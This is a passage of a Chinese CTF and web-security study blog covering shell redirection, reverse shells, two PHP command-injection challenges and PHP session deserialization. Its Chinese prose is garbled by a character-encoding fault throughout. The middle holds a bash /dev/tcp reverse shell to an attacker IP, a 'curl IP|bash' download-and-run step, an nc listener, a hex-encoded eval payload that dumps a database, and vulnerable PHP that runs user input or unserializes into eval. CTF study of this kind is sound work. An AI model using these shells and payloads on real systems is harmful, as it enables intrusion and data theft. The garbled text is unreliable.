é™¤ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œä¸å­˜åœ¨çš„è¯åˆ™ç›´æ¥åˆ›å»ºã€‚ä½†æ˜¯å½“ä½¿ç”¨&gt;&gt;è¿›è¡Œè¿½åŠ æ—¶ï¼Œåˆ™ä¸ä¼šåˆ é™¤åŸæ¥å·²ç»å­˜åœ¨çš„æ–‡ä»¶</strong></p><p>ç®€å•ç”¨æ³•å°±ä¸ä¸¾ä¾‹å­äº†</p><p>é«˜çº§ç”¨æ³•ï¼š</p><p>#å°†é”™è¯¯è¾“å‡ºä¿¡æ¯å…³é—­æ‰ï¼Œæ§åˆ¶å°åªæ‰“å°äº†æ ‡å‡†è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;&amp;-</span><br></pre></td></tr></table></figure><p>this is a.txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>this is a.txt</p><p>#&amp;[n] ä»£è¡¨æ˜¯å·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œ&amp;1 ä»£è¡¨è¾“å‡º &amp;2ä»£è¡¨é”™è¯¯è¾“å‡º&amp;-ä»£è¡¨å…³é—­ä¸å®ƒç»‘å®šçš„æè¿°ç¬¦</p><p>#&#x2F;dev&#x2F;null è¿™ä¸ªè®¾å¤‡ï¼Œæ˜¯linux ä¸­é»‘æ´è®¾å¤‡ï¼Œä»€ä¹ˆä¿¡æ¯åªè¦è¾“å‡ºç»™è¿™ä¸ªè®¾å¤‡ï¼Œéƒ½ä¼šç»™åƒæ‰</p><p>#å…³é—­æ‰€æœ‰è¾“å‡º</p><p>#å…³é—­ 1 ï¼Œ2 æ–‡ä»¶æè¿°ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 1&gt;&amp;- 2&gt;&amp;-</span><br></pre></td></tr></table></figure><p>#å°†1,2 è¾“å‡ºè½¬å‘ç»™&#x2F;dev&#x2F;nullè®¾å¤‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[chengmo@centos5 shell]$ ls test.sh test1.sh  2&gt;/dev/null 1&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>#å°†æ ‡å‡†è¾“å‡ºfd&#x3D;1é‡å®šå‘åˆ°&#x2F;dev&#x2F;nullæ–‡ä»¶ï¼Œç„¶åå°†fd&#x3D;2é‡å®šå‘åˆ°fd&#x3D;1æ‰€ç»‘å®šçš„&#x2F;dev&#x2F;nullæ–‡ä»¶ã€‚è¿™ç§å¸¸ç”¨æ–‡ä»¶æè¿°ç¬¦å‰å¿…é¡»æœ‰ä¸ª &amp;, å¦åˆ™2&gt;1å°±å˜æˆå°†é”™è¯¯è¾“å‡ºè¾“å‡ºåˆ°ä¸€ä¸ªåä¸º1çš„æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]<span class="built_in">cat</span> 1.txt 2.txt &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure><p>#&amp;&gt;ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°&#x2F;dev&#x2F;nullæ–‡ä»¶</p><h3 id="è¾“å…¥é‡å®šå‘å®ä¾‹"><a href="#è¾“å…¥é‡å®šå‘å®ä¾‹" class="headerlink" title="è¾“å…¥é‡å®šå‘å®ä¾‹"></a><strong>è¾“å…¥é‡å®šå‘å®ä¾‹</strong></h3><p>æˆ‘ä»¬ä½¿ç”¨<code>&lt;</code>å¯¹è¾“å…¥åšé‡å®šå‘ï¼Œ<strong>å¦‚æœç¬¦å·å·¦è¾¹æ²¡æœ‰å†™å€¼ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯0ã€‚</strong> <strong>æ ¼å¼ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command-line [n] &lt;æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>å‘½ä»¤é»˜è®¤ä»é”®ç›˜è·å¾—çš„è¾“å…¥ï¼Œä½¿ç”¨è¾“å…¥é‡å®šå‘æ”¹æˆä»æ–‡ä»¶ï¼Œæˆ–è€…å…¶å®ƒæ‰“å¼€æ–‡ä»¶ä»¥åŠè®¾å¤‡è¾“å…¥ã€‚æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œå°†æ ‡å‡†è¾“å…¥0ï¼Œä¸æ–‡ä»¶æˆ–è®¾å¤‡ç»‘å®šï¼Œå°†ç”±å®ƒè¿›è¡Œè¾“å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat &gt; stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">[root@sccprocddev02:/home/upro01]cat stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br></pre></td></tr></table></figure><p>#è¿™é‡Œä½¿ç”¨ctrl+d æˆ–è€…ctrl+cé€€å‡ºè¾“å…¥</p><p>#ä»æ ‡å‡†è¾“å…¥[é”®ç›˜]è·å¾—æ•°æ®ï¼Œç„¶åè¾“å‡ºç»™stdout.txtæ–‡ä»¶</p><p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout2.txt &lt; stdout.txt</p><p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat stdout2.txt</p><p>this is stdout.txt</p><p>#ä»stdout.txtè·å¾—è¾“å…¥æ•°æ®ï¼Œç„¶åè¾“å‡ºç»™æ–‡ä»¶stdout2.txt</p><p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout3.txt &lt;&lt; end</p><blockquote><p>first line</p><p>second line</p><p>end</p><p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]#cat stdout3.txt</p><p>first line</p><p>second line</p><p>#&lt;&lt; è¿™ä¸ªè¿ç»­ä¸¤ä¸ªå°ç¬¦å·ï¼Œ ä»–ä»£è¡¨çš„æ˜¯[ç»“æŸçš„è¾“å…¥å­—ç¬¦]çš„æ„æ€ã€‚è¿™æ ·å½“ç©ºè¡Œè¾“å…¥endå­—ç¬¦æ—¶ï¼Œè‡ªåŠ¨é€€å‡ºè¾“å…¥ï¼Œä¸éœ€è¦ä½¿ç”¨ctrl+dæˆ–è€…ctrl+cé€€å‡º</p></blockquote><p>å…ˆç®€å•äº†è§£ä¸‹è¿™ä¸¤ä¸ª</p><p>å›åˆ°Bashåå¼¹shell</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.<span class="number">72/2333</span> <span class="number">0</span>&gt;&amp;1</span><br></pre></td></tr></table></figure><p>æˆ–</p><p>bash -c â€œbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1â€    #æ›´ç¨³å®š</p><p>#bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»æœºIP&#x2F;æ”»å‡»æœºç«¯å£ 0&gt;&amp;1</p><p>&amp;[n] ä»£è¡¨æ˜¯å·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œ&amp;1 ä»£è¡¨è¾“å‡º &amp;2ä»£è¡¨é”™è¯¯è¾“å‡º&amp;-ä»£è¡¨å…³é—­ä¸å®ƒç»‘å®šçš„æè¿°ç¬¦</p><p>æ‰€ä»¥è¿™æ®µæŒ‡ä»¤å°±æ˜¯åœ¨ç›®æ ‡åŠå’Œä¸»æœºä¹‹é—´è¿›è¡Œä¸€ä¸ªbashçš„shelläº¤äº’ç¯å¢ƒï¼Œåœ¨ä¸»æœºä¸Šä»é”®ç›˜è¾“å‡ºåˆ°0ï¼ˆä¹Ÿå°±æ˜¯è¾“å‡ºåˆ°ç›®æ ‡æœºä¸Šæ¯”å¦‚æˆ‘ä»¬æ‰§è¡ŒæŒ‡ä»¤ï¼‰ï¼Œç›®æ ‡æœºè¿›è¡Œè¾“å‡ºï¼ˆæ”¶åˆ°ä¸»æœºçš„æŒ‡ä»¤ï¼Œè¿›è¡Œè¾“å‡ºåˆ°ä¸»æœºä¸Šé¢ï¼‰ä»è€Œå½¢æˆå›è·¯</p><p>ç„¶åæ”»å‡»æœºåœ¨æœ¬åœ°ç›‘å¬å°±å¯ä»¥äº†</p><p>nc -lvvn 2333</p><p>Curlé…åˆBashåå¼¹shellé¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢<strong>åˆ›å»ºä¸€ä¸ªindexæ–‡ä»¶</strong>ï¼ˆindex.phpæˆ–index.htmlï¼‰ï¼Œå†…å®¹å¦‚ä¸‹</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p><p>#ä½¿ç”¨ bash -i å‘½ä»¤å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„ Bash shellã€‚ç„¶åå°† shell çš„æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ° TCP è¿æ¥ä¸Š,è¿æ¥åˆ° IP åœ°å€ 47.xxx.xxx.72 çš„ 2333 ç«¯å£</p><p>å¹¶å¼€å¯2333ç«¯å£çš„ç›‘å¬ç„¶åå†ç›®æ ‡æœºä¸Šæ‰§è¡Œå¦‚ä¸‹ï¼Œå³å¯åå¼¹shellï¼š</p><p>curl 47.xxx.xxx.72|bash</p><p>#ä½¿ç”¨curlæŒ‡ä»¤ä» IP åœ°å€ 47.xxx.xxx.72 ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶æˆ–è„šæœ¬ã€‚ç„¶åå°†ä¸‹è½½çš„å†…å®¹é€šè¿‡ç®¡é“ç¬¦ | ä¼ é€’ç»™ bash å‘½ä»¤,ä¹Ÿå°±æ˜¯æ‰§è¡Œè¿™ä¸ªä¸‹è½½çš„è„šæœ¬ã€‚</p><p><code>curl IP|bash</code> ä¸­çš„IPå¯ä»¥æ˜¯ä»»æ„æ ¼å¼çš„ï¼Œå¯ä»¥æ˜¯åè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€å…«è¿›åˆ¶ã€äºŒè¿›åˆ¶ç­‰ç­‰ã€‚</p><p>åŸºæœ¬äº†è§£äº†bashçš„åå¼¹shellä¹‹åæˆ‘ä»¬æ‰¾é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;  <span class="keyword">return</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  &#125;  <span class="keyword">else</span>&#123;     <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®çš„å…³é”®å‡½æ•°</p><p><strong>strCheck()å‡½æ•°</strong>æ˜¯ç”¨æ¥æ£€æŸ¥è¾“å…¥çš„å‘½ä»¤æ˜¯å¦åŒ…å«ä¸€äº›å±é™©çš„å…³é”®å­—,æ¯”å¦‚;ã€&amp;ã€$ç­‰ã€‚å¦‚æœåŒ…å«è¿™äº›å…³é”®å­—,å‡½æ•°ä¼šç›´æ¥é€€å‡ºå¹¶è¾“å‡ºâ€i hate thisâ€ã€‚</p><p>cmdè¿›è¡Œä¼ å‚ä¼ ç»™strCheck()</p><p><strong>å¦‚æœstrCheck()å‡½æ•°æ²¡æœ‰æ‹¦æˆªè¯¥å‘½ä»¤,ä»£ç ä¼šä½¿ç”¨</strong></p><p><strong>shell_exec()å‡½æ•°æ‰§è¡Œè¯¥å‘½ä»¤</strong></p><p>shell_exec()æ˜¯PHPä¸­ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä¸€ä¸ªå‡½æ•°ã€‚å®ƒçš„ä½œç”¨æ˜¯æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºæˆ–å‘½ä»¤,å¹¶å°†è¯¥å‘½ä»¤çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚</p><p>ç”¨äº†shell_execå‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½å›æ˜¾ï¼Œè¿™é‡Œå¯ä»¥ç”¨é‡å®šå‘å°†å‘½ä»¤å†™å…¥åˆ°æŒ‡å®šçš„æ–‡ä»¶</p><p>åˆ©ç”¨é‡å®šå‘æ‰§è¡Œls &#x2F; è¾“å‡ºåˆ°1.txt</p><p>è¿›å…¥1.txt</p><p>æ‰§è¡ŒåŒæ ·æ“ä½œ</p><p>çœ‹åˆ°flagï¼Œä¸‹é¢å°†flagè¿›è¡Œè¾“å‡º</p><p>å†æ¬¡è®¿é—®1.txtå¾—åˆ°flag</p><h2 id="CISCN2024-simple-php"><a href="#CISCN2024-simple-php" class="headerlink" title="CISCN2024 simple_php"></a><strong>CISCN2024 simple_php</strong></h2><p>ä»Šå¹´å›½èµ›çš„ä¸€é“é¢˜ç›®</p><p>å±å®è®©æˆ‘ä¸€è„¸æ‡µé€¼        </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$cmd</span> = escapeshellcmd<span class="variable">$$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>,<span class="variable">$cmd</span>)) </span><br><span class="line"></span><br><span class="line">&#123;     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆå¤šå‡½æ•°æˆ‘éƒ½æ²¡è§è¿‡ï¼Œè¿˜è¿‡æ»¤è¿™ä¹ˆå¤šä¸œè¥¿</p><p>åç‰¢ä¸€ä¸‹åˆ</p><p>å‡½æ•°å°±ä¸è¿›è¡Œè§£é‡Šäº†</p><p>å‘ç°å¯ä»¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œäº†ç»•è¿‡</p><p>çœ‹äº†ä¸€äº›wpï¼Œè¿™äº›äººæ˜¯è¿™ä¹ˆæƒ³åˆ°çš„ï¼Ÿä»–ä»¬ç«Ÿç„¶èƒ½ç”¨rceæ¥åšè¿™é¢˜</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure><p>php -rè¿™çœŸè®©äººéš¾ä»¥æƒ³åˆ°</p><p>æ‰¾åˆ°flagå°±å¯ä»¥äº†</p><p>æ–‡ç« ï¼š<a href="https://xia0ji233.pro/2024/05/19/CISCN2024/index.html">https://xia0ji233.pro/2024/05/19/CISCN2024/index.html</a></p><p>è¿˜æœ‰ä¸€ç§å°±æ˜¯åå¼¹shelläº†</p><p>ä»¥ä¸ºå¯ä»¥%0aæ¢è¡Œç¬¦å·ç»•è¿‡</p><p>åœ¨å¤ç°ä¹‹å‰æˆ‘å¾—å…ˆæ­å»ºä¸ªæœåŠ¡å™¨ç»™è‡ªå·±</p><p>æ‰€ä»¥è¿™å‡ å¤©æˆ‘çœ‹èƒ½ä¸èƒ½æ­å»ºè‡ªå·±çš„æœåŠ¡å™¨</p><h1 id="PHPçš„sessionååºåˆ—åŒ–æ¼æ´"><a href="#PHPçš„sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPçš„sessionååºåˆ—åŒ–æ¼æ´"></a><strong>PHPçš„sessionååºåˆ—åŒ–æ¼æ´</strong></h1><p>ååºåˆ—åŒ–è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹çš„åŸºç¡€ï¼Œç°åœ¨çš„æƒ³æ³•å°±æ˜¯è¾¹åšé¢˜è¾¹çœ‹wpè¾¹å­¦ä¹ åšç¬”è®°ï¼Œå…ˆå­¦å¹¿åœ¨æ…¢æ…¢å­¦ç²¾</p><p>SESSIONå…ˆäº†è§£ä¸‹</p><p><strong>PHP Session æ¦‚è¿°</strong></p><p>session æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™ï¼ˆæœåŠ¡å™¨ï¼‰æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼ã€‚ä¸€æ—¦å¼€å¯äº† session ä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨ï¼ˆä¿æŒï¼‰è¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€œå¯¹è¯â€æœºåˆ¶ã€‚</p><p>è¿™æ˜¯å®˜æ–¹çš„è§£é‡Š</p><p>session ä¼šè¯ä¼šä¸ºæ¯ä¸€ä¸ªå¼€å¯äº† session ä¼šè¯çš„è®¿é—®è€…å»ºç«‹ä¸€ä¸ªå”¯ä¸€çš„ä¼šè¯ ID ï¼Œç”¨äºè¯†åˆ«ç”¨æˆ·ã€‚è¯¥ä¼šè¯ ID å¯èƒ½å­˜å‚¨äºç”¨æˆ·ç”µè„‘çš„ cookie å†…ï¼Œä¹Ÿå¯èƒ½é€šè¿‡ URL æ¥ä¼ é€’ã€‚è€Œå¯¹åº”çš„å…·ä½“ session å€¼ä¼šå­˜å‚¨äºæœåŠ¡å™¨ç«¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ cookie çš„ä¸»è¦åŒºåˆ«ï¼Œå¹¶ä¸”å®‰å…¨æ€§ç›¸å¯¹è¾ƒé«˜ã€‚</p><p>å›åˆ°sessionçš„ååºåˆ—åŒ–</p><p>åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š</p><ul><li><code>session.save_path=&quot;&quot;</code>  â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</li><li><code>session.save_handler=&quot;&quot;</code>â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</li><li><code>session.auto_start  boolen</code> â€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨</li><li><code>session.serialize_handler  string</code>â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</li></ul><p>ä»¥ä¸Šçš„é€‰é¡¹å°±æ˜¯ä¸PHPä¸­çš„Sessionå­˜å‚¨å’Œåºåˆ—è¯å­˜å‚¨æœ‰å…³çš„é€‰é¡¹ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><ul><li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> è¡¨æ˜æ‰€æœ‰çš„sessionæ–‡ä»¶éƒ½æ˜¯å­˜å‚¨åœ¨xampp&#x2F;tmpä¸‹</li><li><code>session.save_handler=files</code>   è¡¨æ˜sessionæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥è¿›è¡Œå­˜å‚¨çš„</li><li><code>session.auto_start=0</code>  è¡¨æ˜é»˜è®¤ä¸å¯åŠ¨session</li><li><code>session.serialize_handler=php</code>   è¡¨æ˜sessionçš„é»˜è®¤åºåˆ—è¯å¼•æ“ä½¿ç”¨çš„æ˜¯phpåºåˆ—è¯å¼•æ“</li></ul><ol><li><strong>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li><li><strong>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</strong></li><li><strong>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li></ol><p><strong>å­˜å‚¨æœºåˆ¶</strong></p><p>phpä¸­çš„sessionä¸­çš„å†…<strong>å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜</strong>ä¸­**çš„ï¼Œè€Œæ˜¯ä»¥*æ–‡ä»¶******çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹<code>session.save_handler</code>æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚</p><p>å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—è¯ä¹‹åçš„å†…å®¹ã€‚</p><p>å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒæ˜¯xamppï¼Œé‚£ä¹ˆé»˜è®¤é…ç½®å¦‚ä¸Šæ‰€è¿°ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">åœ¨php_serialzieå¼•æ“ä¸‹</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code> ã€‚a:1æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚</p><p><strong>åœ¨php_binaryå¼•æ“ä¸‹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯<code>names:6:&quot;spoock&quot;;</code> ã€‚ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯EOTã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯<code>names:6:&quot;spoock&quot;;</code>ã€‚(çªç„¶å‘ç°ASCIIçš„å€¼ä¸º4çš„å­—ç¬¦æ— æ³•åœ¨ç½‘é¡µä¸Šé¢æ˜¾ç¤ºï¼Œè¿™ä¸ªå¤§å®¶è‡ªè¡Œå»æŸ¥ASCIIè¡¨å§)</p><p><strong>åºåˆ—åŒ–ç®€å•åˆ©ç”¨</strong></p><?phpclass syclover{ var $func=""; function __construct() {  $this->func = "phpinfo()"; } function __wakeup(){  eval($this->func); }}unserialize($_GET['a']);?><p>åœ¨11è¡Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†åºåˆ—åŒ–ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–ä¸ºsycloverçš„ä¸€ä¸ªç¤ºä¾‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œ<code>eval()</code>æ–¹æ³•ã€‚æˆ‘ä»¬è®¿é—®<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code>ã€‚</p><p>å¾—åˆ°çš„ååºåˆ—åŒ–å†…å®¹æ˜¯</p><p>object(syclover)[1]</p><p> public â€˜funcâ€™ &#x3D;&gt; string â€˜echo â€œspoockâ€;â€™ (length&#x3D;14)</p><p><strong>PHP Sessionä¸­çš„åºåˆ—åŒ–å±å®³</strong></p><p>PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚</p><p>å¦‚æœåœ¨PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ç¬¬ååºåˆ—åŒ–ã€‚é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ä¾‹å¦‚:</p><p>$_SESSION<code>[</code>â€˜ryatâ€™<code>] = 